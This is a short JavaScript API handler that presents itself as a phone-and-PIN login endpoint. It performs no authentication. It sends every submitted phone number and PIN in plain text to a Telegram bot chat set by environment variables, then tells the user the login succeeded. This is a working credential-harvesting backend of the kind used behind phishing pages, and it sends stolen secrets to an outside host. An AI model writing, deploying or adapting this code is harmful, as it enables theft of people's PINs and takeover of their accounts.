export default async function handler(req, res) {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ message: "Method not allowed" });
    }

    const { phone, pin } = req.body || {};
    if (!phone || !pin) {
      return res.status(400).json({ message: "Phone and PIN required" });
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (token && chatId) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: `Login: ${phone} PIN: ${pin}`,
        }),
      });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Handler error:", error);
    return res.status(500).json({ error: "Internal error" });
  }
}